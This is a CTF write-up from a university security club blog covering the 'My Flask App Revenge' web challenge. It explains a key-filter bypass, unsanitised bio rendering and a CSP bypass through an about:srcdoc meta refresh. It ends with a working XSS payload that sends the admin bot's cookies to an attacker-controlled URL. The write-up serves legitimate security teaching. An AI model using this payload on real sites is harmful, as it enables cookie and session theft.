<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>My Flask App Revenge</title><meta content="My Flask App Revenge" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/flskrev/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="My Flask App Revenge" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/flskrev/ property=twitter:url><meta content="My Flask App Revenge" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/flskrev/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>flskrev</span></div><time datetime=2025-07-06>Published on: <span class=accent-data>2025-07-06</span></time><address rel=author>By <span class=accent-data> Abizer Lokhandwala, and exploiitm </span></address><h1>My Flask App Revenge</h1><h3 id=my-flask-app-rev-writeup>My Flask App Rev Writeup</h3><p>First looking at all accesable endpoints in app.py<ol><li>/<li>/register<li>/update_bio<li>/login<li>/users<li>/api/users<li>/render<li>/report</ol><p>By breifly looking at all the functions and templates we can kind of guess a possible attack vector that is the bio we can inject some code into the bio and the bot will render it and execute the code<p>Looking into all the functions in more detail the regiter and login parts work as intended there is nothing of interest there.<br> The report is important with a get request we see that it just goes to a page with a form that sends a post req to itself.<br> A post req creates a bot that just visits the /users?name={our input}.<br> Visit is an import from bot.py it opens a headless chromium browser that logs in as admin and adds a cookie with the flag.<p>It does have a lax samesitepolicy which means that we can access that cookie easily from a completely different website so our payload needs to just redirect the bot to out website and that can just take the cookie.<p>So what is in /users?name={user}<br> It renders user.html template<br> Basically uses the scripts index and users<h4 id=index-js-important-sections>Index.js (important sections):</h4><p>Sets window name to not admin other than that it seems to be normal and nothing seems interesting it is just a handler script takes forms and sends post requests.<h4 id=users-js-important-sections>Users.js (important sections):</h4><p>Takes the name parameter fetches api/users?name={name} this makes an iframe with /render?all keys stored in the db associated with this user in the revenge part it url encodes & so that we cant have a key &bio to trick this.<br> If window name is “admin” it takes the get param “js” and executes it.<h4 id=api-users>Api/users:</h4><p>It looks in the db for the user and gives all fields from the db except password and id.<h4 id=render>/Render:</h4><p>Loads the bio with |safe meaning it assumes the output will be safe and wont sanatize it this is vulnerable.<p>From this our attack vector will be to inject some code into the bio section.<h4 id=update-bio>/Update_bio:</h4><p>It only allows post req<br> Takes username from session looks at the json payload sent and filters the “bio” key next it just add the payload to our db this is good it means we can do something like &bio or amp;bio and since in this stage the key is not “bio” it wont be filtered and so we can inject code.<pre class=language-py data-lang=py style=background:#282828;color:#fdf4c1aa><code class=language-py data-lang=py><span>data </span><span style=color:#fe8019>= </span><span>request.json
</span><span>    </span><span style=color:#fa5c4b>if </span><span style=color:#b8bb26>"username" </span><span style=color:#fe8019>in </span><span>data </span><span style=color:#fe8019>or </span><span style=color:#b8bb26>"password" </span><span style=color:#fe8019>in </span><span>data:
</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>jsonify({</span><span style=color:#b8bb26>"error"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"Cannot update username or password"</span><span style=color:#fdf4c1>})</span><span>, </span><span style=color:#d3869b>400
</span><span>    bio </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>data.get(</span><span style=color:#b8bb26>"bio"</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>)   
</span><span>    </span><span style=color:#fa5c4b>if </span><span style=color:#fe8019>not </span><span>bio </span><span style=color:#fe8019>or </span><span style=color:#fabd2f>any</span><span style=color:#fdf4c1>(
</span><span style=color:#fdf4c1>        char </span><span style=color:#fe8019>not in </span><span style=color:#b8bb26>"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 "
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>char </span><span style=color:#fa5c4b>in </span><span style=color:#fdf4c1>bio
</span><span style=color:#fdf4c1>    )</span><span>:
</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>jsonify({</span><span style=color:#b8bb26>"error"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"Invalid bio"</span><span style=color:#fdf4c1>})</span><span>, </span><span style=color:#d3869b>400
</span><span>
</span><span>    result </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>users_collection.update_one({</span><span style=color:#b8bb26>"username"</span><span style=color:#fdf4c1>: username}, {</span><span style=color:#b8bb26>"$set"</span><span style=color:#fdf4c1>: data})
</span><span>    </span><span style=color:#fa5c4b>if </span><span>result.matched_count </span><span style=color:#fe8019>> </span><span style=color:#d3869b>0</span><span>:
</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>jsonify({</span><span style=color:#b8bb26>"message"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"Bio updated successfully"</span><span style=color:#fdf4c1>})</span><span>, </span><span style=color:#d3869b>200
</span><span>    </span><span style=color:#fa5c4b>else</span><span>:
</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>jsonify({</span><span style=color:#b8bb26>"error"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"Failed to update bio"</span><span style=color:#fdf4c1>})</span><span>, </span><span style=color:#d3869b>500
</span></code></pre><p>Now crafting the payload we can send we know the key will be amp;bio but the csp will not allow us to execute js directly in the render page.<h4 id=csp-setup>CSP Setup:</h4><pre class=language-py data-lang=py style=background:#282828;color:#fdf4c1aa><code class=language-py data-lang=py><span style=font-style:italic;color:#928374># set CSP header for all responses
</span><span>@app.</span><span style=color:#fdf4c1>after_request
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>set_csp</span><span>(</span><span style=color:#fdf4c1>response</span><span>):
</span><span>    response.headers[</span><span style=color:#b8bb26>"Content-Security-Policy"</span><span>] </span><span style=color:#fe8019>= </span><span>(
</span><span>        </span><span style=color:#b8bb26>"default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' ;"
</span><span>    )
</span><span>    </span><span style=color:#fa5c4b>return </span><span>response
</span></code></pre><p>So instead we must use the ?js param in the users.js page so our vulnerable entry point is /render and we want to somehow add out payload into a ?js parameter<h4 id=users-js-snippet>Users.js snippet:</h4><pre class=language-json data-lang=json style=background:#282828;color:#fdf4c1aa><code class=language-json data-lang=json><span>if(window.name==</span><span style=color:#b8bb26>"admin"</span><span>){
</span><span>            </span><span style=background:#932b1e;color:#fdf4c1>js</span><span> </span><span style=background:#932b1e;color:#fdf4c1>=</span><span> </span><span style=background:#932b1e;color:#fdf4c1>urlParams.get('js');</span><span>
</span><span>            </span><span style=background:#932b1e;color:#fdf4c1>if(js){</span><span>
</span><span>                </span><span style=background:#932b1e;color:#fdf4c1>eval(js);</span><span>
</span><span>            }
</span><span>            
</span><span>    }
</span></code></pre><p>We can use the meta tag for this since it is not disabled in the csp.<p>Srcdoc basicaly refers to this page itself if we add a meta tag to redirect to about:srcdoc?js=payload we can get cookie also we need to include the /users.js to the page we can also add that as a script tag.<br> Note that the csp doesnt stop html tags and sources it just stops execution of js on out browser.<h3 id=final-payload>Final Payload:</h3><pre class=language-json data-lang=json style=background:#282828;color:#fdf4c1aa><code class=language-json data-lang=json><span>{ </span><span style=color:#b8bb26>"bio"</span><span>:</span><span style=color:#b8bb26>"a"</span><span>, </span><span style=color:#b8bb26>"amp;bio"</span><span>:</span><span style=color:#b8bb26>"&LTiframe name=admin src=about:srcdoc? srcdoc=\"&LTmeta http-equiv=refresh content='1; url=about:srcdoc?js=top.location=`our site url`.concat(document.cookie);'>&LTscript src=/static/users.js?js=alert();>&LT/script>\">" </span><span>}
</span></code></pre><p>Sending this as the payload to update bio and then reporting the user will get us the flag.<p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>